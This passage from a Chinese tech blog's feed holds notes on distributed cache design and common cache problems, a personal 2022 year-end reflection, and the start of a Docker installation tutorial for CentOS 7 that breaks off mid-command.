    <content type="html"><![CDATA[<h1 id="分布式缓存笔记"><a href="#分布式缓存笔记" class="headerlink" title="分布式缓存笔记"></a>分布式缓存笔记</h1><h2 id="1-缓存简介"><a href="#1-缓存简介" class="headerlink" title="1. 缓存简介"></a>1. 缓存简介</h2><h3 id="1-1-缓存的基本思想"><a href="#1-1-缓存的基本思想" class="headerlink" title="1.1 缓存的基本思想"></a>1.1 缓存的基本思想</h3><p>缓存定义</p><ul><li>缓存最初的含义，是指用于加速 CPU 数据交换的 RAM，即随机存取存储器，通常这种存储器使用更昂贵但快速的静态 RAM（SRAM）技术，用以对 DRAM进 行加速。这是一个狭义缓存的定义。</li><li>而<strong>广义缓存</strong>的定义则更宽泛，任何可以用于数据高速交换的存储介质都是缓存，可以是硬件也可以是软件。</li></ul><p>缓存存在的意义就是通过开辟一个新的数据交换缓冲区，来解决原始数据获取代价太大的问题，让数据得到更快的访问。</p><p>基本思想：时间局限性原理，通过空间换时间来达到加速数据获取的目的。</p><ul><li><p>时间局限性原理：被获取过一次的数据在未来会被多次饮用</p></li><li><p>空间换时间：原始数据获取太慢，因此开辟一块高速独立空间，提供高速访问，加快获取速度</p></li><li><p>性能-成本 Tradeoff：性能越高，延迟越小，所带来的成本也会越高。</p><p>相同成本的容量，SSD 硬盘容量会比内存大 10～30 倍以上，但读写延迟却高 50～100 倍。</p></li></ul><h3 id="1-2-缓存优势"><a href="#1-2-缓存优势" class="headerlink" title="1.2 缓存优势"></a>1.2 缓存优势</h3><ul><li>提升访问性能：基于内存</li><li>降低网络拥堵：缓存数据比原始数据小很多</li><li>减轻服务负载：解析与计算减少</li><li>增强可扩展性：缓存读写性能高，预热快，遭遇突发流量与性能瓶颈时，可快速部署上线</li></ul><h3 id="1-3-缓存代价"><a href="#1-3-缓存代价" class="headerlink" title="1.3 缓存代价"></a>1.3 缓存代价</h3><ul><li>引入缓存，增加了系统的复杂度</li><li>缓存相比于原始DB存储的成本更高，部署与运维费用也更高</li><li>数据存在于缓存与原始DB中，多份数据之间存在一致性问题。缓存本身也存在可用性与分区问题</li></ul><p>一般来讲，服务系统的全量原始数据存储在 DB 中（如 MySQL、HBase 等），所有数据的读写都可以通过 DB 操作来获取。但 DB 读写性能低、延迟高，如 MySQL 单实例的读写 QPS 通常只有千级别（3000～6000），读写平均耗时 10～100ms 级别，如果一个用户请求需要查 20 个不同的数据来聚合，仅仅 DB 请求就需要数百毫秒甚至数秒。而 cache 的读写性能正好可以弥补 DB 的不足，比如 Memcached 的读写 QPS 可以达到 10～100万 级别，读写平均耗时在 1ms 以下，结合并发访问技术，单个请求即便查上百条数据，也可以轻松应对。</p><p>但 cache 容量小，只能存储部分访问频繁的热数据，同时，同一份数据可能同时存在 cache 和 DB，如果处理不当，就会出现数据不一致的问题。所以服务系统在处理业务请求时，需要对 cache 的读写方式进行适当设计，既要保证数据高效返回，又要尽量避免数据不一致等各种问题。</p><h3 id="1-4-缓存读写模式"><a href="#1-4-缓存读写模式" class="headerlink" title="1.4 缓存读写模式"></a>1.4 缓存读写模式</h3><h4 id="1-4-1-Cache-Aside-旁路缓存"><a href="#1-4-1-Cache-Aside-旁路缓存" class="headerlink" title="1.4.1 Cache Aside 旁路缓存"></a>1.4.1 Cache Aside 旁路缓存</h4><p>对于写：更新 DB 后，直接将 key 从 cache 中删除，然后由 DB 驱动缓存数据的更新</p><p>对于读：是先读 cache，如果 cache 没有，则读 DB，同时将从 DB 中读取的数据回写到 cache。</p><p>特点：由业务端处理数据访问细节，利用Lazy计算的思想，更新DB后，直接删除cache并通过DB更新，确保数据以DB结果为准。</p><p>适用情景：</p><ul><li>没有专门的存储服务，同时对数据一致性要求较高的业务</li><li>缓存数据更新比较复杂的业务</li></ul><p>微博发展初期，不少业务采用这种模式，这些缓存数据需要通过多个原始数据进行计算后设置。在部分数据变更后，直接删除缓存。同时，使用一个 Trigger 组件，实时读取 DB 的变更日志，然后重新计算并更新缓存。如果读缓存的时候，Trigger 还没写入 cache，则由调用方自行到 DB 加载计算并写入 cache。</p><h4 id="1-4-2-Read-x2F-Write-Through-读写穿透"><a href="#1-4-2-Read-x2F-Write-Through-读写穿透" class="headerlink" title="1.4.2 Read&#x2F;Write Through 读写穿透"></a>1.4.2 Read&#x2F;Write Through 读写穿透</h4><p>对于Cache Aside模式，业务应用需要同时维护cache和DB两个数据存储方，过于繁琐。</p><p>对于Read&#x2F;Write Through模式，业务应用只需关注一个存储服务，而读写cache和DB的操作由存储服务代理。</p><ul><li>存储服务收到写请求，先查cache：<ul><li>如果数据在cache中不存在，则更新DB</li><li>如果数据在cache中存在，则先更新cache，再更新DB</li></ul></li><li>存储服务收到读请求：<ul><li>如果cache命中，则直接返回；否则先从DB加载，回种到cache后返回响应</li></ul></li></ul><p>特点：</p><ul><li>存储服务封装了所有的数据处理细节，业务应用端代码只用关注业务逻辑本身，系统的隔离性更佳。</li><li>进行写操作时，如果 cache 中没有数据则不更新，有缓存数据才更新，内存效率更高。</li></ul><h4 id="1-4-3-Write-Behind-Caching-异步缓存写入"><a href="#1-4-3-Write-Behind-Caching-异步缓存写入" class="headerlink" title="1.4.3 Write Behind Caching 异步缓存写入"></a>1.4.3 Write Behind Caching 异步缓存写入</h4><p>Write Behind Caching 模式与 Read&#x2F;Write Through 模式类似，也由数据存储服务来管理 cache 和 DB 的读写。</p><p>不同的是：数据更新时，Read&#x2F;write Through 是<strong>同步</strong>更新 cache 和 DB，而 Write Behind Caching 则是只更新缓存，不直接更新 DB，而是改为<strong>异步批量</strong>的方式来更新 DB。</p><p>特点：数据存储的写性能最高，非常适合一些变更特别频繁的业务，特别是可以合并写请求的业务，如计数业务</p><ul><li>一条 Feed 被点赞 1万 次，如果更新 1万 次 DB 代价很大，而合并成一次请求直接加 1万，则是一个非常轻量的操作。</li></ul><p>缺点：数据的一致性变差，甚至在一些极端场景下可能会丢失数据。比如系统 Crash、机器宕机时，如果有数据还没保存到 DB，则会存在丢失的风险。适合于对一致性要求不太高的业务。</p><h3 id="1-5-缓存分类"><a href="#1-5-缓存分类" class="headerlink" title="1.5 缓存分类"></a>1.5 缓存分类</h3><h4 id="1-5-1-按宿主层次分类"><a href="#1-5-1-按宿主层次分类" class="headerlink" title="1.5.1 按宿主层次分类"></a>1.5.1 按宿主层次分类</h4><p>缓存一般可以分为本地 Cache、进程间 Cache 和远程 Cache</p><ul><li>本地 Cache 是指业务进程内的缓存，这类缓存由于在业务系统进程内，所以读写性能超高且无任何网络开销，但不足是会随着业务系统重启而丢失。</li><li>进程间 Cache 是本机独立运行的缓存，这类缓存读写性能较高，不会随着业务系统重启丢数据，并且可以大幅减少网络开销，但不足是业务系统和缓存都在相同宿主机，运维复杂，且存在资源竞争。</li><li>远程 Cache 是指跨机器部署的缓存，这类缓存因为独立设备部署，容量大且易扩展，在互联网企业使用最广泛。不过远程缓存需要跨机访问，在高读写压力下，带宽容易成为瓶颈。</li></ul><p>本地 Cache 的缓存组件有 Ehcache、Guava Cache 等，开发者自己也可以用 Map、Set 等轻松构建一个自己专用的本地 Cache。进程间 Cache 和远程 Cache 的缓存组件相同，只是部署位置的差异罢了，这类缓存组件有 Memcached、Redis、Pika 等。</p><h4 id="1-5-2-按存储介质分类"><a href="#1-5-2-按存储介质分类" class="headerlink" title="1.5.2 按存储介质分类"></a>1.5.2 按存储介质分类</h4><p>分为内存型缓存和持久化型缓存</p><ul><li>内存型缓存将数据存储在内存，读写性能很高，但缓存系统重启或 Crash 后，内存数据会丢失。</li><li>持久化型缓存将数据存储到 SSD&#x2F;Fusion-IO 硬盘中，相同成本下，这种缓存的容量会比内存型缓存大 1 个数量级以上，而且数据会持久化落地，重启不丢失，但读写性能相对低 1～2 个数量级。Memcached 是典型的内存型缓存，而 Pika 以及其他基于 RocksDB 开发的缓存组件等则属于持久化型缓存。</li></ul><h2 id="2-缓存架构设计"><a href="#2-缓存架构设计" class="headerlink" title="2. 缓存架构设计"></a>2. 缓存架构设计</h2><h3 id="2-1-缓存组件选择"><a href="#2-1-缓存组件选择" class="headerlink" title="2.1 缓存组件选择"></a>2.1 缓存组件选择</h3><p>在设计架构缓存时，你首先要选定缓存组件，比如要用 Local-Cache，还是 Redis、Memcached、Pika 等开源缓存组件，如果业务缓存需求比较特殊，你还要考虑是直接定制开发一个新的缓存组件，还是对开源缓存进行二次开发，来满足业务需要。</p><h3 id="2-2-缓存数据结构设计"><a href="#2-2-缓存数据结构设计" class="headerlink" title="2.2 缓存数据结构设计"></a>2.2 缓存数据结构设计</h3><p>对于直接简单 KV 读写的业务，你可以将这些业务数据封装为 String、Json、Protocol Buffer 等格式，序列化成字节序列，然后直接写入缓存中。读取时，先从缓存组件获取到数据的字节序列，再进行反序列化操作即可。</p><p>对于只需要存取部分字段或需要在缓存端进行计算的业务，你可以把数据设计为 Hash、Set、List、Geo 等结构，存储到支持复杂集合数据类型的缓存中，如 Redis、Pika 等。</p><h3 id="2-3-缓存分布设计"><a href="#2-3-缓存分布设计" class="headerlink" title="2.3 缓存分布设计"></a>2.3 缓存分布设计</h3><ol><li><p>选择分布式算法：取模 or 一致性Hash</p><p>取模分布的方案简单，每个 key 只会存在确定的缓存节点，一致性 Hash 分布的方案相对复杂，一个 key 对应的缓存节点不确定。但一致性 Hash 分布，可以在部分缓存节点异常时，将失效节点的数据访问均衡分散到其他正常存活的节点，从而更好地保证了缓存系统的稳定性。</p></li><li><p>分布读写访问：Client直接进行Hash分布定位读写 or 交由Proxy代理进行读写路由</p><ul><li>Client 直接读写，读写性能最佳，但需要 Client 感知分布策略。在缓存部署发生在线变化时，也需要及时通知所有缓存 Client，避免读写异常，另外，Client 实现也较复杂。</li><li>而通过 Proxy 路由，Client 只需直接访问 Proxy，分布逻辑及部署变更都由 Proxy 来处理，对业务应用开发最友好，但业务访问多一跳，访问性能会有一定的损失。</li></ul></li><li><p>缓存系统运行过程中，如果待缓存的数据量增长过快，会导致大量缓存数据被剔除，缓存命中率会下降，数据访问性能会随之降低，这样就需要将数据从缓存节点进行动态拆分，把部分数据水平迁移到其他缓存节点。这个迁移过程需要考虑，是由 Proxy 进行迁移还是缓存 Server 自身进行迁移，甚至根本就不支持迁移。对于 Memcached，一般不支持迁移，对 Redis，社区版本是依靠缓存 Server 进行迁移，而对 Codis 则是通过 Admin、Proxy 配合后端缓存组件进行迁移。</p></li></ol><h3 id="2-4-缓存架构部署及运维"><a href="#2-4-缓存架构部署及运维" class="headerlink" title="2.4 缓存架构部署及运维"></a>2.4 缓存架构部署及运维</h3><ol><li>核心的、高并发访问的不同数据，需要分别分拆到独立的缓存池中，进行分别访问，避免相互影响；访问量较小、非核心的业务数据，则可以混存。</li><li>对海量数据、访问超过 10～100万 级的业务数据，要考虑分层访问，并且要分摊访问量，避免缓存过载。</li><li>如果业务系统需要多 IDC 部署甚至异地多活，则需要对缓存体系也进行多 IDC 部署，要考虑如何跨 IDC 对缓存数据进行更新，可以采用直接跨 IDC 读写，也可以采用 DataBus 配合队列机进行不同 IDC 的消息同步，然后由消息处理机进行缓存更新，还可以由各个 IDC 的 DB Trigger 进行缓存更新。</li><li>某些极端场景下，还需要把多种缓存组件进行组合使用，通过缓存异构达到最佳读写性能。</li><li>站在系统层面，要想更好得管理缓存，还要考虑缓存的服务化，考虑缓存体系如何更好得进行集群管理、监控运维等。</li></ol><h3 id="2-5-缓存设计架构的常见考量点"><a href="#2-5-缓存设计架构的常见考量点" class="headerlink" title="2.5 缓存设计架构的常见考量点"></a>2.5 缓存设计架构的常见考量点</h3><h4 id="2-5-1-读写方式"><a href="#2-5-1-读写方式" class="headerlink" title="2.5.1 读写方式"></a>2.5.1 读写方式</h4><p>首先是 value 的读写方式。是全部整体读写，还是只部分读写及变更？是否需要内部计算？比如，用户粉丝数，很多普通用户的粉丝有几千到几万，而大 V 的粉丝更是高达几千万甚至过亿，因此，获取粉丝列表肯定不能采用整体读写的方式，只能部分获取。另外在判断某用户是否关注了另外一个用户时，也不需要拉取该用户的全部关注列表，直接在关注列表上进行检查判断，然后返回 True&#x2F;False 或 0&#x2F;1 的方式更为高效。</p><h4 id="2-5-2-KV-size"><a href="#2-5-2-KV-size" class="headerlink" title="2.5.2 KV size"></a>2.5.2 KV size</h4><p>如果单个业务的 KV size 过大，需要分拆成多个 KV 来缓存。但是，不同缓存数据的 KV size 如果差异过大，也不能缓存在一起，避免缓存效率的低下和相互影响。</p><h4 id="2-5-3-Key数量"><a href="#2-5-3-Key数量" class="headerlink" title="2.5.3 Key数量"></a>2.5.3 Key数量</h4><ul><li>如果 key 数量不大，可以在缓存中存下全量数据，把缓存当 DB 存储来用。<ul><li>如果缓存读取 miss，则表明数据不存在，不需要去 DB 查询。</li></ul></li><li>如果数据量巨大，则在缓存中尽可能只保留频繁访问的热数据，对于冷数据直接访问 DB。</li></ul><h4 id="2-5-4-读写峰值"><a href="#2-5-4-读写峰值" class="headerlink" title="2.5.4 读写峰值"></a>2.5.4 读写峰值</h4><ul><li>对缓存数据的读写峰值，如果小于 10万 级别，简单分拆到独立 Cache 池即可。</li><li>而一旦数据的读写峰值超过 10万 甚至到达 100万 级的QPS，则需要对 Cache 进行分层处理，可以同时使用 Local-Cache 配合远程 cache，甚至远程缓存内部继续分层叠加分池进行处理。微博业务中，大多数核心业务的 Memcached 访问都采用的这种处理方式。</li></ul><h4 id="2-5-5-命中率"><a href="#2-5-5-命中率" class="headerlink" title="2.5.5 命中率"></a>2.5.5 命中率</h4><p>缓存的命中率对整个服务体系的性能影响甚大。对于核心高并发访问的业务，需要预留足够的容量，确保核心业务缓存维持较高的命中率。比如微博中的 Feed Vector Cache，常年的命中率高达 99.5% 以上。为了持续保持缓存的命中率，缓存体系需要持续监控，及时进行故障处理或故障转移。同时在部分缓存节点异常、命中率下降时，故障转移方案，需要考虑是采用一致性 Hash 分布的访问漂移策略，还是采用数据多层备份策略。</p><h3 id="2-6-过期策略"><a href="#2-6-过期策略" class="headerlink" title="2.6 过期策略"></a>2.6 过期策略</h3><ul><li>可以设置较短的过期时间，让冷 key 自动过期；</li><li>可以让 key 带上时间戳，同时设置较长的过期时间，比如很多业务系统内部有这样一些 key：key_20190801。</li></ul><h2 id="3-缓存问题"><a href="#3-缓存问题" class="headerlink" title="3. 缓存问题"></a>3. 缓存问题</h2><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/CgotOV2kTKKAVD94AAIOd1w5wy8841.png" alt="img" style="zoom: 50%;" /><h3 id="3-1-缓存失效"><a href="#3-1-缓存失效" class="headerlink" title="3.1 缓存失效"></a>3.1 缓存失效</h3><p>业务访问时，如果大量的 key 同时过期，很多缓存数据访问都会 miss，进而穿透到 DB，DB 的压力就会明显上升，由于 DB 的性能较差，只在缓存的 1%~2% 以下，这样请求的慢查率会明显上升。这就是缓存失效的问题。</p><p>对于批量 key 缓存失效的问题，原因既然是预置的固定过期时间，那解决方案也从这里入手。设计缓存的过期时间时，使用公式：过期时间&#x3D;baes 时间+随机时间。即相同业务数据写缓存时，在基础过期时间之上，再加一个随机的过期时间，让数据在未来一段时间内慢慢过期，避免瞬时全部过期，对 DB 造成过大压力。</p><h3 id="3-2-缓存穿透"><a href="#3-2-缓存穿透" class="headerlink" title="3.2 缓存穿透"></a>3.2 缓存穿透</h3><p>有特殊访客在查询一个不存在的 key，导致每次查询都会穿透到 DB，如果这个特殊访客再控制一批肉鸡机器，持续访问你系统里不存在的 key，就会对 DB 产生很大的压力，从而影响正常服务。</p><p>解决方案如下：</p><ul><li>第一种方案就是，查询这些不存在的数据时，第一次查 DB，虽然没查到结果返回 NULL，仍然记录这个 key 到缓存，只是这个 key 对应的 value 是一个特殊设置的值。<ul><li>防止缓存的默认值占据大量缓存空间<ul><li>对不存在的key设置较短的过期时间</li><li>将这些不存在的 key 存在一个独立的公共缓存，从缓存查找时，先查正常的缓存组件，如果 miss，则查一下公共的非法 key 的缓存，如果后者命中，直接返回，否则穿透 DB，如果查出来是空，则回种到非法 key 缓存，否则回种到正常缓存</li></ul></li></ul></li><li>第二种方案是，构建一个 BloomFilter 缓存过滤器，记录全量数据，这样访问数据时，可以直接通过 BloomFilter 判断这个 key 是否存在，如果不存在直接返回即可，根本无需查缓存和 DB。</li></ul><h4 id="3-2-1-BloomFilter"><a href="#3-2-1-BloomFilter" class="headerlink" title="3.2.1 BloomFilter"></a>3.2.1 BloomFilter</h4><p>BloomFilter 的目的是检测一个元素是否存在于一个集合内。</p><p>原理：用 bit 数据组来表示一个集合，对一个 key 进行多次不同的 Hash 检测，如果所有 Hash 对应的 bit 位都是 1，则表明 key 非常大概率存在，平均单记录占用 1.2 字节即可达到 99%，只要有一次 Hash 对应的 bit 位是 0，就说明这个 key 肯定不存在于这个集合内。</p><p>算法：首先分配一块内存空间做 bit 数组，数组的 bit 位初始值全部设为 0，加入元素时，采用 k 个相互独立的 Hash 函数计算，然后将元素 Hash 映射的 K 个位置全部设置为 1。检测 key 时，仍然用这 k 个 Hash 函数计算出 k 个位置，如果位置全部为 1，则表明 key 存在，否则不存在。</p><h3 id="3-3-缓存雪崩"><a href="#3-3-缓存雪崩" class="headerlink" title="3.3 缓存雪崩"></a>3.3 缓存雪崩</h3><h3 id="3-4-缓存数据不一致"><a href="#3-4-缓存数据不一致" class="headerlink" title="3.4 缓存数据不一致"></a>3.4 缓存数据不一致</h3><p>两个问题：DB与缓存数据不一致、多个缓存副本中的数据不一致</p><p>不一致的问题大多跟缓存更新异常有关。</p><ul><li>更新DB后，写缓存失败</li><li>rehash自动漂移策略，在节点多次上下线之后，会产生脏数据</li><li>缓存存在多个副本，更新某副本失败，导致数据不一致</li></ul><p>业务场景</p><ul><li>在缓存机器的带宽被打满，或者机房网络出现波动时，缓存更新失败，新数据没有写入缓存，就会导致缓存和 DB 的数据不一致。</li><li>缓存 rehash 时，某个缓存机器反复异常，多次上下线，更新请求多次 rehash。这样，一份数据存在多个节点，且每次 rehash 只更新某个节点，导致一些缓存节点产生脏数据。</li></ul><p>解决方案</p><ul><li>第一个方案，cache 更新失败后，可以进行重试，如果重试失败，则将失败的 key 写入队列机服务，待缓存访问恢复后，将这些 key 从缓存删除。这些 key 在再次被查询时，重新从 DB 加载，从而保证数据的一致性。</li><li>第二个方案，缓存时间适当调短，让缓存数据及早过期后，然后从 DB 重新加载，确保数据的最终一致性。</li><li>第三个方案，不采用 rehash 漂移策略，而采用缓存分层策略，尽量避免脏数据产生。</li></ul><h3 id="3-5-数据并发竞争"><a href="#3-5-数据并发竞争" class="headerlink" title="3.5 数据并发竞争"></a>3.5 数据并发竞争</h3><p>高并发访问场景下，一旦缓存访问没有找到数据，大量请求会涌入DB，导致DB压力增大。</p><p>一般是由于缓存中数据key正好过期，导致多个线程并发查询DB</p><p>数据并发竞争在大流量系统也比较常见，比如车票系统，如果某个火车车次缓存信息过期，但仍然有大量用户在查询该车次信息。又比如微博系统中，如果某条微博正好被缓存淘汰，但这条微博仍然有大量的转发、评论、赞。上述情况都会造成该车次信息、该条微博存在并发竞争读取的问题。</p><p>解决方案</p><ul><li><p>使用全局锁：当缓存miss后，多个线程并发竞争锁。只有加锁成功的线程，才可以到DB去加载数据</p><p>其他线程读取缓存miss时，且无法获取到锁，则等待</p></li><li><p>对缓存数据保持多个备份，即便其中一个备份中的数据过期或被剔除了，还可以访问其他备份，从而减少数据并发竞争的情况</p></li></ul><h3 id="3-6-Hot-Key问题"><a href="#3-6-Hot-Key问题" class="headerlink" title="3.6 Hot Key问题"></a>3.6 Hot Key问题</h3><p>大量并发请求访问同一个key，流量集中打在同一个缓存节点机器，导致缓存访问变慢、卡顿</p><p>解决方案：</p><ol><li><p>寻找热点key</p><ul><li><p>对于提前预知的Hot Key，如重要节假日、促销活动等，提前进行分散处理</p></li><li><p>对于突发事件，可通过Spark，对于流任务进行实时分析，及时发现新发布的热点key</p><p>对于逐步发酵成为的热点key，可以通过Hadoop对批处理任务进行离线计算，找出历史数据的热点key</p></li></ul></li><li><p>对缓存节点进行分散</p><p>采用多副本+多级结合的缓存架构设计</p><p>业务端采用本地缓存</p><p>通过监控体系对缓存的 SLA 实时监控，通过快速扩容来减少热 key 的冲击</p></li></ol><h3 id="3-7-Big-Key问题"><a href="#3-7-Big-Key问题" class="headerlink" title="3.7 Big Key问题"></a>3.7 Big Key问题</h3><p>Big Key：指在缓存访问时，部分 Key 的 Value 过大，读写、加载易超时的现象。</p><p>原因：</p><ol><li><p>Big Key数量多：</p><p>如果业务中这种大 key 很多，而这种 key 被大量访问，缓存组件的网卡、带宽很容易被打满，也会导致较多的大 key 慢查询。</p></li><li><p>Big Key中内容多：</p><p>如果大 key 缓存的字段较多，每个字段的变更都会引发对这个缓存数据的变更，同时这些 key 也会被频繁地读取，读写相互影响，也会导致慢查现象。</p></li><li><p>Big Key被淘汰或过期：</p><p>大 key 一旦被缓存淘汰，DB 加载可能需要花费很多时间，这也会导致大 key 查询慢的问题。</p></li></ol><p>业务场景：</p><p>互联网系统中需要保存用户最新 1万 个粉丝的业务，比如一个用户个人信息缓存，包括基本资料、关系图谱计数、发 feed 统计等。</p><p>微博的 feed 内容缓存也很容易出现，一般用户微博在 140 字以内，但很多用户也会发表 1千 字甚至更长的微博内容，这些长微博也就成了大 key。</p><p>解决方案：</p><ol><li>如果数据存在 Mc 中，可以设计一个缓存阀值，当 value 的长度超过阀值，则对内容启用压缩，让 KV 尽量保持小的 size，其次评估大 key 所占的比例，在 Mc 启动之初，就立即预写足够数据的大 key，让 Mc 预先分配足够多的 trunk size 较大的 slab。确保后面系统运行时，大 key 有足够的空间来进行缓存。</li><li>如果数据存在 Redis 中，比如业务数据存 set 格式，大 key 对应的 set 结构有几千几万个元素，这种写入 Redis 时会消耗很长的时间，导致 Redis 卡顿。此时，可以扩展新的数据结构，同时让 client 在这些大 key 写缓存之前，进行序列化构建，然后通过 restore 一次性写入。</li><li>将大 key 分拆为多个 key，尽量减少大 key 的存在。同时由于大 key 一旦穿透到 DB，加载耗时很大，所以可以对这些大 key 进行特殊照顾，比如设置较长的过期时间，比如缓存内部在淘汰 key 时，同等条件下，尽量不淘汰这些大 key。</li></ol>]]></content>
    
    
    <categories>
      
      <category>数据库及缓存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式</tag>
      
      <tag>缓存</tag>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022</title>
    <link href="/2022/12/30/2022/"/>
    <url>/2022/12/30/2022/</url>
    
    <content type="html"><![CDATA[<h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><p>第一次在年尾写总结。今年算是诸事顺利吧。</p><p>年初很焦虑，香港申请全部失败，英国录取的专业也谈不上满意。</p><p>但幸运的是，在接近绝望的时候，NUS录取了我，扫除了年初的阴霾哈哈哈哈。</p><p>之后便是匆忙地写毕设，准备毕业。过程很平淡，没有什么毕业季的狂欢，没有失落、难过或是兴奋等各种情绪，整个人比较麻木吧。</p><p>和舍友以及几个好朋友聚了聚，然后就这样，毕业了！</p><p>之后，便是收拾行李回家，平淡地过完了暑假一个月，最后和家人朋友老师一起吃了顿饭，然后踏上出国的征程。</p><p>来到新加坡适应得也很快，除了生活环境差一些，天气热一些，别的也不错。在国内独居生活一年多，也让我很快地适应了这里。</p><p>来了这里随便逛了逛，便正式开始了第一个学期。</p><p>紧接着是四个月的学习，走出了Comfort Zone，意识到自己与他人的差距，四个月时间学了很多东西，有点脑过载了哈哈哈哈，</p><p>这也是我第一次强烈地感觉到自己真正入门了CS专业。</p><p>捋一捋这一年发生的事情，似乎是无事发生，我之前觉得2021足够平淡了哈哈哈，没想到2022更加平淡。</p><p>感情上也是一如既往地失败，结束了两段，许多回忆都是比较痛苦的，也可能是选择性回忆。</p><p>这也是今年改变很大的一点，真切意识到没有人能够一直陪在自己身边，许多路还是得一个人走哈哈哈哈。</p><p>当然，也有一些很棒的事情发生。</p><p>第一件事情是真正找到了自己喜欢的事情。</p><p>去年9月第一次接触到Web，自此一发不可收拾。一步步地学习，从什么都不会的小白，到现在刚刚入门。</p><p>同时也发现，越是什么都不会，越是觉得自己会的很多。初学的时候，学到或做了一点东西，就想着炫耀一下，以为自己很懂。</p><p>但最近越来越真切感觉到需要学的东西挺多的，也没有之前那么浮躁了，慢慢来吧。</p><p>第二件事情是观念发生了改变。</p><p>我开始意识到自己过往的一些认知是错误的，一些事情颠覆了自己的世界。但同时整个人也清醒了很多</p><p>我也发现当接受的信息量足够大时，每个人很难做到独立思考。世界并不是非黑即白的哈哈哈哈。</p><p>得知了一位朋友是跨性别者，这也是我第一次有意识地接触到了这个词 Transgender。</p><p>性少数群体真的很不容易，很艰难。难以想象他们所受的痛苦。</p><p>未来我也想做一些事情比如咨询去帮助这些人，帮助他们筛选一些各国信息。</p><p>第三件事情是年末认识了很多朋友。</p><p>以前初中高中的时候，身边朋友很多。但到了大学之后慢慢地开始逃避社交，几乎没有认识很多朋友，习惯了独来独往。</p><p>但人还是社交动物呀，最近发现有朋友真的挺好的，很开心，也不会存在社交压力。</p><p>过去三年都比较平淡甚至有点艰难哈哈哈，希望2023一切顺遂哈哈哈哈哈。</p>]]></content>
    
    
    <categories>
      
      <category>日常总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="/2022/12/10/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/12/10/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker学习笔记"><a href="#Docker学习笔记" class="headerlink" title="Docker学习笔记"></a>Docker学习笔记</h1><h2 id="1-Docker入门"><a href="#1-Docker入门" class="headerlink" title="1. Docker入门"></a>1. Docker入门</h2><h3 id="1-1-Docker三要素"><a href="#1-1-Docker三要素" class="headerlink" title="1.1 Docker三要素"></a>1.1 Docker三要素</h3><ol><li><p>镜像：只读模板，可以用来创建Docker容器。一个镜像可以创建多个容器实例。</p><p>Docker镜像类似于Java的类，而Docker容器则类似于Java的对象</p></li><li><p>容器：Docker利用容器独立运行一个或一组应用，应用程序或服务运行在容器里面，容器类似于一个虚拟化的运行环境</p><p>容器可以被启动、开始、停止、删除。每个容器都是互相隔离、保证安全的平台</p></li><li><p>仓库：集中存放镜像文件的场所。DockerHub、阿里云仓库、网易云仓库等</p></li></ol><h3 id="1-2-Docker工作原理"><a href="#1-2-Docker工作原理" class="headerlink" title="1.2 Docker工作原理"></a>1.2 Docker工作原理</h3><p>Docker是一个Client-Server结构系统。Docker的守护进程运行在主机上。</p><p>用户通过Socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器</p><p>基本流程如下：</p><ol><li>用户使用Docker Client与Docker Daemon建立通信，并发送请求给后者</li><li>Docker Daemon作为Docker架构中的主体部分，首先提供Docker Server的功能，使其可以接受Docker Client的请求</li><li>Docker Engine执行Docker内部的一系列工作，每一项工作都是以一个Job形式存在</li><li>Job运行过程中，如果需要容器镜像时，从Docker Registry中下载镜像，并通过镜像管理驱动Graph Driver将下载的镜像以Graph形式存储。</li><li>当需要为Docker创建网络环境时，通过网络管理驱动Network Driver创建并配置Docker容器网络环境。</li><li>当需要限制Docker容器运行资源或执行用户指令等操作时，通过Exec Driver完成。</li><li>LibContainer是一项独立的容器管理包，Network Driver以及Exec Driver都是通过LibContainer实现具体对容器进行的操作。</li></ol><h3 id="1-3-CentOS-7-安装-Docker"><a href="#1-3-CentOS-7-安装-Docker" class="headerlink" title="1.3 CentOS 7 安装 Docker"></a>1.3 CentOS 7 安装 Docker</h3><ol><li><p>确认当前虚拟机为CentOS 7 版本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>redhat-release<br></code></pre></td></tr></table></figure></li><li><p>卸载旧版Docker</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">sudo yum remove docker <span class="hljs-string">\</span><br>                  docker-client <span class="hljs-string">\</span><br>                  docker-client-latest <span class="hljs-string">\</span><br>                  docker-common <span class="hljs-string">\</span><br>                  docker-latest <span class="hljs-string">\</span><br>                  docker-latest-logrotate <span class="hljs-string">\</span><br>                  docker-logrotate <span class="hljs-string">\</span><br>                  docker-engine<br></code></pre></td></tr></table></figure></li><li><p>yum安装gcc相关</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> gcc<br>yum -y <span class="hljs-keyword">install</span> gcc-c++<br></code></pre></td></tr></table></figure></li><li><p>yum安装说需要的软件包</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y yum-utils<br></code></pre></td></tr></table></figure></li><li><p>yum设置镜像仓库</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">yum-config-manager \<br>    --add-repo \<br>    https:<span class="hljs-regexp">//</span>download.docker.com<span class="hljs-regexp">/linux/</span>centos/docker-ce.repo<br></code></pre></td></tr></table></figure></li><li><p>更新yum软件包索引</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yum makecache 